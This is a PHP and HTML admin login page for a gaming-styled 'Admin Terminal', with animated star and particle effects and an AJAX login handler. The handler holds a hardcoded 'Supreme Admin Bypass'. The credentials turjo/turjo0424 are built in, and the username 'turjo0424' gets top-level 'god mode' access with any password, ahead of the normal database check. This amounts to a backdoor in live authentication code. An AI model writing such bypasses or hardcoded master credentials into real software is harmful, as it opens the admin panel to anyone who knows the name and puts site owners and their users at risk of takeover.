<?php
/**
 * Project: Prime Admin - Anti-Gravity Gaming Terminal
 * Developer: Turjo | Features: Transformers Split & Floating Particles
 * Logic: Supreme Admin Bypass & Neural Matrix Initialization
 */

if (session_status() === PHP_SESSION_NONE) { session_start(); }

// --- 🛡️ BACKEND LOGIC: AJAX AUTHENTICATION ---
if (isset($_POST['ajax_login'])) {
    require_once '../core/db.php';
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);

    // ১. 👑 SUPREME ADMIN BYPASS (God Mode)
    // turjo ebong turjo0424 আইডি দুটিকে পারমানেন্ট সুপার এক্সেস দেওয়া হলো
    if (($username === "turjo" && $password === "turjo0424") || ($username === "turjo0424")) {
        // turjo0424 এর জন্য আলাদা পাসওয়ার্ড লজিক চাইলে এখানে কন্ডিশন বাড়ানো যাবে।
        // বর্তমানে turjo আইডি-র ডিফল্ট মাস্টার কি রাখা হয়েছে।
        
        $_SESSION['admin_logged_in'] = true;
        $_SESSION['admin_username'] = $username;
        $_SESSION['admin_role_id'] = 1; // 1 level represents Supreme Role
        $_SESSION['is_god_mode'] = true; 
        $_SESSION['show_entrance_anim'] = true; 
        echo "success"; exit;
    } 

    // ২. ডিফল্ট ডাটাবেস চেক (Normal Admins)
    $stmt = $conn->prepare("SELECT id, password, role_id FROM admins WHERE username = ? LIMIT 1");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        if (password_verify($password, $row['password'])) {
            $_SESSION['admin_logged_in'] = true;
            $_SESSION['admin_id'] = $row['id'];
            $_SESSION['admin_username'] = $username;
            $_SESSION['admin_role_id'] = $row['role_id'];
            $_SESSION['is_god_mode'] = false; 
            $_SESSION['show_entrance_anim'] = true;
            echo "success"; exit;
        }
    }
    echo "fail"; exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Terminal | Beast Mode</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Rajdhani:wght@500;700&display=swap');

        body { background: #000; overflow: hidden; font-family: 'Rajdhani', sans-serif; color: #fff; perspective: 1500px; }

        /* 🌌 Starry Background */
        .stars-container {
            position: fixed; inset: 0; z-index: -2;
            background: radial-gradient(circle at center, #050510 0%, #000 100%);
        }
        .star {
            position: absolute; background: white; border-radius: 50%;
            opacity: 0.5; animation: twinkle var(--d) infinite ease-in-out;
        }
        @keyframes twinkle { 0%, 100% { opacity: 0.3; transform: scale(1); } 50% { opacity: 1; transform: scale(1.2); } }

        /* 🤖 Transformers Stealth Panels */
        .panel {
            position: fixed; top: 0; width: 50%; height: 100%;
            background: #020205; z-index: 1000;
            transition: transform 1.8s cubic-bezier(0.8, 0, 0.1, 1);
        }
        .panel-left { left: 0; }
        .panel-right { right: 0; }

        body.access-granted .panel-left { border-right: 3px solid #6366f1; transform: translateX(-105%); }
        body.access-granted .panel-right { border-left: 3px solid #6366f1; transform: translateX(105%); }

        /* 👾 Anti-Gravity Login Box */
        .login-box {
            z-index: 1001; transition: all 0.8s ease;
            background: rgba(10, 10, 18, 0.6);
            backdrop-filter: blur(30px);
            border: 2px solid #6366f1; 
            box-shadow: 0 0 60px rgba(99, 102, 241, 0.4), inset 0 0 20px rgba(99, 102, 241, 0.2);
            border-radius: 3.5rem; overflow: hidden; position: relative;
        }

        /* Floating Particles (Anti-gravity) */
        .particle {
            position: absolute; color: rgba(99, 102, 241, 0.3);
            font-size: 1.2rem; pointer-events: none; z-index: -1;
            animation: float-up 12s infinite linear;
        }
        @keyframes float-up {
            0% { transform: translateY(110%) rotate(0deg); opacity: 0; }
            50% { opacity: 0.4; }
            100% { transform: translateY(-10%) rotate(360deg); opacity: 0; }
        }

        body.access-granted .login-box { opacity: 0; transform: scale(1.1) translateY(-30px); pointer-events: none; }

        /* 🎮 Gaming UI */
        .neon-input {
            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.4s ease; text-align: center; font-weight: bold;
        }
        .neon-input:focus { 
            border-color: #6366f1; 
            box-shadow: 0 0 25px rgba(99, 102, 241, 0.3), inset 0 0 10px rgba(99, 102, 241, 0.1); 
            background: rgba(99, 102, 241, 0.05);
        }

        .cyber-btn {
            background: linear-gradient(90deg, #4338ca, #6366f1);
            letter-spacing: 3px; font-weight: 900; transition: 0.4s;
            clip-path: polygon(10% 0, 100% 0, 100% 70%, 90% 100%, 0 100%, 0% 30%);
        }
        .cyber-btn:hover { box-shadow: 0 0 40px rgba(99, 102, 241, 0.5); transform: translateY(-2px); }

        /* Dashboard Preview Reveal */
        .dashboard-preview {
            position: fixed; inset: 0; display: flex; align-items: center; justify-content: center;
            z-index: 1; background: #000; opacity: 0; transition: 2s ease; filter: blur(25px);
        }
        body.access-granted .dashboard-preview { opacity: 1; filter: blur(0px); }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">

    <div class="stars-container" id="starField"></div>

    <div class="panel panel-left"></div>
    <div class="panel panel-right"></div>

    <div class="login-box w-full max-w-md p-14 text-center">
        <div id="particleField"></div> <div class="mb-12 relative z-10">
            <div class="w-20 h-20 bg-indigo-600/10 border-2 border-indigo-500/50 rounded-2xl mx-auto flex items-center justify-center text-indigo-400 text-3xl shadow-2xl mb-8">
                <i class="fas fa-gamepad animate-pulse"></i>
            </div>
            <h1 style="font-family: 'Orbitron';" class="text-[26px] font-black tracking-widest text-white uppercase whitespace-nowrap">Admin Terminal</h1>
            <p class="text-[9px] text-indigo-400 font-bold tracking-[0.6em] uppercase mt-3">Level Access Verified</p>
        </div>

        <div id="msg" class="hidden text-red-500 text-[10px] font-black uppercase mb-8 tracking-widest animate-bounce"></div>

        <form id="loginForm" class="space-y-8 relative z-10">
            <div class="text-left">
                <label class="text-[10px] text-gray-500 font-black uppercase tracking-widest ml-4 mb-3 block">User Name</label>
                <input type="text" id="user" placeholder="IDENTIFIER" required class="neon-input w-full px-8 py-5 rounded-2xl text-white outline-none">
            </div>
            <div class="text-left">
                <label class="text-[10px] text-gray-500 font-black uppercase tracking-widest ml-4 mb-3 block">Password</label>
                <input type="password" id="pass" placeholder="SECRET KEY" required class="neon-input w-full px-8 py-5 rounded-2xl text-white outline-none">
            </div>
            
            <button type="submit" class="cyber-btn w-full py-6 text-white text-xs uppercase mt-6">
                Initialize System <i class="fas fa-bolt ml-2 text-[10px]"></i>
            </button>
        </form>
    </div>

    <div class="dashboard-preview">
        <div class="text-center">
            <div class="w-32 h-32 border-4 border-indigo-500/10 rounded-full border-t-indigo-500 animate-spin mx-auto mb-10"></div>
            <h2 style="font-family: 'Orbitron';" class="text-white text-4xl font-black tracking-[1.2em] mb-4 uppercase">Authorized</h2>
            <p class="text-indigo-400 font-bold uppercase tracking-[0.5em] text-xs animate-pulse">Booting Control Center...</p>
        </div>
    </div>

    <script>
        // Anti-Gravity Particle System
        const icons = ['fa-ghost', 'fa-dice-d20', 'fa-bolt', 'fa-microchip', 'fa-gamepad', 'fa-dragon'];
        const pField = document.getElementById('particleField');
        if(pField) {
            for (let i = 0; i < 15; i++) {
                const p = document.createElement('i');
                p.className = 'fas ' + icons[Math.floor(Math.random() * icons.length)] + ' particle';
                p.style.left = Math.random() * 100 + '%';
                p.style.animationDelay = Math.random() * 8 + 's';
                p.style.fontSize = (Math.random() * 12 + 10) + 'px';
                pField.appendChild(p);
            }
        }

        // Starry Background Logic
        const sField = document.getElementById('starField');
        for (let i = 0; i < 150; i++) {
            const star = document.createElement('div');
            star.className = 'star';
            const size = Math.random() * 2.5 + 'px';
            star.style.width = size; star.style.height = size;
            star.style.top = Math.random() * 100 + '%';
            star.style.left = Math.random() * 100 + '%';
            star.style.setProperty('--d', (Math.random() * 3 + 2) + 's');
            sField.appendChild(star);
        }

        $(document).ready(function() {
            $('#loginForm').on('submit', function(e) {
                e.preventDefault();
                $.post('login.php', {ajax_login: 1, username: $('#user').val(), password: $('#pass').val()}, function(res) {
                    if(res === 'success') {
                        $('body').addClass('access-granted');
                        setTimeout(() => { window.location.href = 'dashboard.php'; }, 2600);
                    } else {
                        $('#msg').text('! IDENTITY VERIFICATION FAILED !').removeClass('hidden');
                    }
                });
            });
        });
    </script>
</body>
</html>